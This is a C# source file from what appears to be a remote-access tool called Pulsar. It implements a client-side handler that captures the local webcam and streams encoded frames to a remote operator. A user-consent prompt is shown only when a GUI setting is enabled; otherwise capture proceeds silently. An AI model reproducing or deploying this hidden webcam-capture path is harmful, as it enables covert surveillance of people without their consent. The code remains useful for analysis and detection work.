using Pulsar.Client.Helper;
using Pulsar.Common.Enums;
using Pulsar.Common.Networking;
using Pulsar.Common.Video;
using Pulsar.Common.Video.Codecs;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Diagnostics;
using Pulsar.Common.Messages.Webcam;
using Pulsar.Common.Messages.Other;
using System.Collections.Concurrent;
using Pulsar.Client.Config;

namespace Pulsar.Client.Messages
{    
    public class RemoteWebcamHandler : NotificationMessageProcessor, IDisposable
    {
        private UnsafeStreamCodec _streamCodec;
        private BitmapData _webcamData = null;
        private Bitmap _webcam = null;
        private ISender _clientMain;
        private Thread _captureThread;
        private WebcamHelper _webcamHelper;
        private readonly object _sessionLock = new object();

        private WebcamHelper WebcamHelper
        {
            get
            {
                if (_webcamHelper == null)
                {
                    _webcamHelper = new WebcamHelper();
                }
                return _webcamHelper;
            }
        }

        private CancellationTokenSource _cancellationTokenSource;

        // frame control variables
        private readonly ConcurrentQueue<BufferedFrame> _frameBuffer = new ConcurrentQueue<BufferedFrame>();
        private readonly AutoResetEvent _frameRequestEvent = new AutoResetEvent(false);
        private int _pendingFrameRequests = 0;

        // max buffer size to prevent memory issues
        private const int MAX_BUFFER_SIZE = 10;

        private readonly Stopwatch _stopwatch = new Stopwatch();
        private int _frameCount = 0;
        private float _lastFrameRate = 0f;
        private bool _sendFrameRateNext = false;

        private MemoryStream _reusableStream;

        private string _sessionId;
        private long _frameSequence;
        private bool _disposed;

        private sealed class BufferedFrame
        {
            public byte[] Data;
            public long Timestamp;
        }

        private MemoryStream ReusableStream
        {
            get
            {
                if (_reusableStream == null)
                {
                    _reusableStream = new MemoryStream();
                }
                return _reusableStream;
            }
        }

        public override bool CanExecute(IMessage message) => message is GetWebcam ||
                                                             message is GetAvailableWebcams;

        public override bool CanExecuteFrom(ISender sender) => true;

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetWebcam msg:
                    Execute(sender, msg);
                    break;
                case GetAvailableWebcams msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, GetWebcam message)
        {
            if (_disposed)
                return;

            if (message.Status == RemoteWebcamStatus.Stop)
            {
                if (string.IsNullOrWhiteSpace(message.SessionId) ||
                    string.Equals(message.SessionId, _sessionId, StringComparison.Ordinal))
                {
                    StopWebcamStreaming();
                }
            }
            else if (message.Status == RemoteWebcamStatus.Start)
            {
                StartWebcamStreaming(client, message);
            }
            else if (message.Status == RemoteWebcamStatus.Continue)
            {
                if (!string.IsNullOrWhiteSpace(message.SessionId) &&
                    !string.Equals(message.SessionId, _sessionId, StringComparison.Ordinal))
                {
                    Debug.WriteLine("Ignoring continue request for a stale webcam session.");
                    return;
                }

                // server is requesting more frames
                int framesRequested = Math.Max(1, Math.Min(message.FramesRequested, 12));
                Interlocked.Add(ref _pendingFrameRequests, framesRequested);
                _frameRequestEvent.Set();
            }
        }

        private void StartWebcamStreaming(ISender client, GetWebcam message)
        {
            try
            {
                lock (_sessionLock)
                {
                    if (_disposed)
                        return;

                    if (_captureThread != null && _captureThread.IsAlive)
                    {
                        StopWebcamStreamingCore(sendStoppedStatus: false);
                    }
                }

                if (Settings.SHOWCLIENTGUI)
                {
                    bool allowed = GUI.RemoteDesktopPermissionPrompt.RequestUserConsent(
                        30,
                        "Remote Webcam",
                        "A remote operator is requesting to view your webcam.");
                    if (!allowed)
                    {
                        SendWebcamStatus(client, message.SessionId, MediaStreamStatus.Denied,
                            "MEDIA_CONSENT_DENIED", "Denied by user.");
                        return;
                    }
                }

                try
                {
                    if (!WebcamHelper.StartWebcam(message.DisplayIndex))
                    {
                        SendWebcamStatus(client, message.SessionId, MediaStreamStatus.Unavailable,
                            "WEBCAM_UNAVAILABLE", "The webcam could not be started.");
                        return;
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error starting webcam: {ex.Message}");
                    OnReport("Failed to start webcam: " + ex.Message);
                    SendWebcamStatus(client, message.SessionId, MediaStreamStatus.Error,
                        "WEBCAM_START_FAILED", ex.Message);
                    return;
                }
                Debug.WriteLine("Starting remote webcam session");

                Bounds webcamBounds = WebcamHelper.GetBounds();
                var deadline = DateTime.UtcNow.AddSeconds(2);
                while ((webcamBounds.Width <= 0 || webcamBounds.Height <= 0) &&
                       DateTime.UtcNow < deadline)
                {
                    Thread.Sleep(50);
                    webcamBounds = WebcamHelper.GetBounds();
                }
                if (webcamBounds.Width <= 0 || webcamBounds.Height <= 0)
                {
                    WebcamHelper.StopWebcam();
                    SendWebcamStatus(client, message.SessionId, MediaStreamStatus.Unavailable,
                        "WEBCAM_NO_FRAME", "The webcam opened but no valid frame was available.");
                    return;
                }
                var resolution = new Resolution { Height = webcamBounds.Height, Width = webcamBounds.Width };

                try
                {
                    if (_streamCodec == null)
                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);

                    if (message.CreateNew)
                    {
                        _streamCodec?.Dispose();
                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
                        OnReport("Remote webcam session started");
                    }

                    if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
                    {
                        _streamCodec?.Dispose();
                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error initializing stream codec: {ex.Message}");
                    OnReport("Failed to initialize stream codec: " + ex.Message);
                    return;
                }

                _clientMain = client;
                _sessionId = string.IsNullOrWhiteSpace(message.SessionId)
                    ? Guid.NewGuid().ToString("N")
                    : message.SessionId;
                Interlocked.Exchange(ref _frameSequence, 0);

                // clear any pending frame requests and existing frames
                ClearFrameBuffer();
                int initialFrames = Math.Max(1, Math.Min(message.FramesRequested, 12));
                Interlocked.Exchange(ref _pendingFrameRequests, initialFrames);

                if (_captureThread == null || !_captureThread.IsAlive)
                {
                    try
                    {
                        _cancellationTokenSource = new CancellationTokenSource();
                        _captureThread = new Thread(() => BufferedCaptureLoop(_cancellationTokenSource.Token));
                        _captureThread.Start();
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error starting capture thread: {ex.Message}");
                        OnReport("Failed to start capture thread: " + ex.Message);
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Unexpected error in StartWebcamStreaming: {ex.Message}");
                OnReport("Unexpected error: " + ex.Message);
            }
        }

        private void StopWebcamStreaming()
        {
            lock (_sessionLock)
            {
                StopWebcamStreamingCore(sendStoppedStatus: true);
            }
        }

        private void StopWebcamStreamingCore(bool sendStoppedStatus)
        {
            try
            {
                string stoppedSessionId = _sessionId;
                try
                {
                    WebcamHelper.StopWebcam();
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error stopping webcam: {ex.Message}");
                }
                Debug.WriteLine("Stopping remote webcam session");

                _cancellationTokenSource?.Cancel();
                var cts = _cancellationTokenSource;
                _cancellationTokenSource = null;

                if (_captureThread != null && _captureThread.IsAlive)
                {
                    try
                    {
                        _frameRequestEvent.Set(); // wake up thread
                        if (!_captureThread.Join(1000))
                        {
                            Debug.WriteLine("Capture thread did not stop within the timeout.");
                        }
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error joining capture thread: {ex.Message}");
                    }
                    _captureThread = null;
                }

                if (_webcam != null)
                {
                    if (_webcamData != null)
                    {
                        try
                        {
                            _webcam.UnlockBits(_webcamData);
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Error unlocking bits: {ex.Message}");
                        }
                        _webcamData = null;
                    }
                    try
                    {
                        _webcam.Dispose();
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error disposing webcam: {ex.Message}");
                    }
                    _webcam = null;
                }

                if (_streamCodec != null)
                {
                    try
                    {
                        _streamCodec.Dispose();
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error disposing stream codec: {ex.Message}");
                    }
                    _streamCodec = null;
                }
                cts?.Dispose();

                // clear the buffer
                ClearFrameBuffer();
                Interlocked.Exchange(ref _pendingFrameRequests, 0);
                if (sendStoppedStatus && _clientMain != null)
                {
                    SendWebcamStatus(_clientMain, stoppedSessionId, MediaStreamStatus.Stopped,
                        null, null);
                }
                _sessionId = null;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Unexpected error in StopWebcamStreaming: {ex.Message}");
            }
        }

        private void BufferedCaptureLoop(CancellationToken cancellationToken)
        {
            Debug.WriteLine("Starting buffered capture loop");
            _stopwatch.Start();

            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // wait for frame requests if the buffer is full or no frames are requested
                    if (_frameBuffer.Count >= MAX_BUFFER_SIZE || _pendingFrameRequests <= 0)
                    {
                        Debug.WriteLine($"Waiting for frame requests. Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
                        _frameRequestEvent.WaitOne(500);

                        // if cancellation was requested during the wait
                        if (cancellationToken.IsCancellationRequested)
                            break;

                        continue;
                    }

                    // capture frame and add to buffer
                    byte[] frameData = CaptureFrame();
                    if (frameData != null)
                    {
                        _frameBuffer.Enqueue(new BufferedFrame
                        {
                            Data = frameData,
                            Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
                        });

                        // increment frame counter for statistics
                        _frameCount++;
                        if (_stopwatch.ElapsedMilliseconds >= 1000)
                        {
                            Debug.WriteLine($"Capture FPS: {_frameCount}, Buffer size: {_frameBuffer.Count}, Pending requests: {_pendingFrameRequests}");
                            _lastFrameRate = _frameCount;
                            _frameCount = 0;
                            _stopwatch.Restart();
                            _sendFrameRateNext = true;
                        }
                    }

                    // send frames if we have pending requests
                    while (_pendingFrameRequests > 0 && _frameBuffer.TryDequeue(out BufferedFrame frameToSend))
                    {
                        SendFrameToServer(frameToSend, Interlocked.Decrement(ref _pendingFrameRequests) == 0);
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error in buffered capture loop: {ex.Message}");
                    Thread.Sleep(100); // Avoid tight loop in case of repeated errors
                }
            }

            Debug.WriteLine("Buffered capture loop ended");
        }        
        
        private byte[] CaptureFrame()
        {
            Bitmap webcam = null;
            BitmapData webcamData = null;
            try
            {
                webcam = WebcamHelper.GetLatestFrame();

                if (webcam == null)
                {
                    return null;
                }

                const PixelFormat codecPixelFormat = PixelFormat.Format32bppArgb;
                Bitmap processedBitmap = webcam;
                
                if (webcam.PixelFormat != codecPixelFormat)
                {
                    try
                    {
                        processedBitmap = new Bitmap(webcam.Width, webcam.Height, codecPixelFormat);
                        using (Graphics g = Graphics.FromImage(processedBitmap))
                        {
                            g.DrawImage(webcam, 0, 0, webcam.Width, webcam.Height);
                        }
                        webcam.Dispose();
                        webcam = processedBitmap;
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error converting pixel format: {ex.Message}");
                        processedBitmap = webcam;
                    }
                }

                webcamData = processedBitmap.LockBits(new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                    ImageLockMode.ReadWrite, processedBitmap.PixelFormat);

                ReusableStream.Position = 0;
                ReusableStream.SetLength(0);

                if (_streamCodec == null) throw new Exception("StreamCodec can not be null.");
                _streamCodec.CodeImage(webcamData.Scan0,
                    new Rectangle(0, 0, processedBitmap.Width, processedBitmap.Height),
                    new Size(processedBitmap.Width, processedBitmap.Height),
                    processedBitmap.PixelFormat, ReusableStream);

                return ReusableStream.ToArray();
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error capturing frame: {ex.Message}");
                return null;
            }
            finally
            {
                if (webcamData != null && webcam != null)
                {
                    try
                    {
                        webcam.UnlockBits(webcamData);
                    }
                    catch (Exception ex)
                    {
                        Debug.WriteLine($"Error unlocking webcam bits: {ex.Message}");
                    }
                }
                webcam?.Dispose();
            }
        }
        
        private void SendFrameToServer(BufferedFrame frame, bool isLastRequestedFrame)
        {
            byte[] frameData = frame?.Data;
            if (frameData == null || _clientMain == null) return;

            try
            {
                var response = new GetWebcamResponse
                {
                    Image = frameData,
                    Quality = _streamCodec.ImageQuality,
                    Monitor = _streamCodec.Monitor,
                    Resolution = _streamCodec.Resolution,
                    IsLastRequestedFrame = isLastRequestedFrame,
                    FrameRate = 0f,
                    SessionId = _sessionId,
                    Sequence = Interlocked.Increment(ref _frameSequence),
                    Timestamp = frame.Timestamp,
                    Status = MediaStreamStatus.Active
                };

                if (_sendFrameRateNext)
                {
                    response.FrameRate = _lastFrameRate;
                    _sendFrameRateNext = false;
                }

                _clientMain.Send(response);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error sending frame to server: {ex.Message}");
            }
        }

        private void ClearFrameBuffer()
        {
            while (_frameBuffer.TryDequeue(out _)) { }
        }

        private void SendWebcamStatus(ISender client, string sessionId, MediaStreamStatus status,
            string errorCode, string errorMessage)
        {
            if (client == null)
                return;

            client.Send(new GetWebcamResponse
            {
                SessionId = sessionId,
                Sequence = Interlocked.Increment(ref _frameSequence),
                Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
                Status = status,
                ErrorCode = errorCode,
                ErrorMessage = errorMessage
            });
        }

        private void Execute(ISender client, GetAvailableWebcams message)
        {
            client.Send(new GetAvailableWebcamsResponse { Webcams = WebcamHelper.GetWebcams() });
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }        
        
        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                lock (_sessionLock)
                {
                    _disposed = true;
                    StopWebcamStreamingCore(sendStoppedStatus: false);
                    _streamCodec?.Dispose();
                    _streamCodec = null;
                    _cancellationTokenSource?.Dispose();
                    _cancellationTokenSource = null;
                    _frameRequestEvent?.Dispose();
                    _reusableStream?.Dispose();
                    _reusableStream = null;
                }
            }
        }
    }
}
